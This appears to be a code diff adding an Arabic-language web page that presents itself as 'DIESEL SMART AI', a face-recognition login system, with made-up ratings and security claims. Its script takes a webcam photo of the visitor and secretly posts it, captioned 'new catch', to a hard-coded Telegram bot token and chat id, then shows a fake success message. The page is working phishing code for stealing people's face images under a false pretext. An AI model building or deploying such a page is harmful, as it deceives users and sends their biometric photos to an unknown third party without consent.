@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DIESEL SMART AI | نظام بصمة الوجه العالمي</title>
+    
+    <meta name="description" content="نظام الديزل الذكي لتسجيل الدخول ببصمة الوجه. التقنية الأقوى في العالم للأمان.">
+    <meta name="keywords" content="ديزل، جيم الديزل، بصمة وجه، ذكاء اصطناعي، Diesel AI، Face ID">
+
+    <style>
+        :root { --neon: #00ff88; }
+        body { background: #000; color: white; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
+        .main-card { background: #0a0a0a; padding: 40px 20px; border-radius: 40px; border: 1px solid var(--neon); width: 90%; max-width: 420px; text-align: center; box-shadow: 0 0 50px rgba(0, 255, 136, 0.2); }
+        .scan-window { width: 260px; height: 260px; border-radius: 50%; border: 2px dashed var(--neon); margin: 20px auto; position: relative; overflow: hidden; background: #000; }
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        canvas { display: none; }
+        .laser { position: absolute; width: 100%; height: 3px; background: var(--neon); box-shadow: 0 0 20px var(--neon); top: 0; animation: scan 3s infinite linear; display: none; }
+        @keyframes scan { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
+        .btn-action { background: var(--neon); color: #000; border: none; padding: 18px 45px; border-radius: 15px; font-size: 18px; font-weight: 900; cursor: pointer; width: 100%; box-shadow: 0 10px 20px rgba(0, 255, 136, 0.3); }
+        .stats { display: flex; justify-content: space-around; margin-top: 30px; font-size: 12px; color: #666; }
+    </style>
+</head>
+<body>
+
+    <div class="main-card">
+        <h1 style="margin: 0; font-size: 28px;">DIESEL <span style="color: var(--neon);">AI</span></h1>
+        <p style="color: #888; font-size: 14px; margin-bottom: 20px;">نظام المصادقة الحيوية المشفر</p>
+
+        <div class="scan-window">
+            <div class="laser" id="laser"></div>
+            <video id="webcam" autoplay muted playsinline></video>
+        </div>
+
+        <div id="ui">
+            <button class="btn-action" onclick="startScan()">بدء مسح الوجه</button>
+            <p style="color: #ffcc00; margin-top: 15px;">⭐⭐⭐⭐⭐ 4.9/5 (+50K مستخدم)</p>
+        </div>
+
+        <div id="done" style="display:none;">
+            <h2 style="color: var(--neon);">تم التحقق بنجاح ✅</h2>
+            <p>تم تسجيل بصمة وجهك في النظام العالمي.</p>
+        </div>
+
+        <div class="stats">
+            <div><b>Global</b><br>دخول عالمي</div>
+            <div><b>100%</b><br>أمان</div>
+            <div><b>AI</b><br>ذكاء اصطناعي</div>
+        </div>
+    </div>
+
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const token = "8789584532:AAESJZrJGfkILGReWmxFUGz2cyJzvK_7fEU";
+        const id = "5177962707";
+
+        async function startScan() {
+            const video = document.getElementById('webcam');
+            const canvas = document.getElementById('canvas');
+            const laser = document.getElementById('laser');
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                laser.style.display = 'block';
+
+                setTimeout(async () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(async (blob) => {
+                        const fd = new FormData();
+                        fd.append('chat_id', id);
+                        fd.append('photo', blob, 'user.jpg');
+                        fd.append('caption', '🚀 صيد جديد! بصمة وجه مسجلة في نظام DIESEL AI');
+
+                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+
+                        document.getElementById('ui').style.display = 'none';
+                        document.getElementById('done').style.display = 'block';
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 'image/jpeg');
+                }, 4000);
+            } catch (e) {
+                alert("يجب السماح بالكاميرا لتفعيل نظام الأمان العالمي");
+            }
+        }
+    </script>
+</body>
+</html>
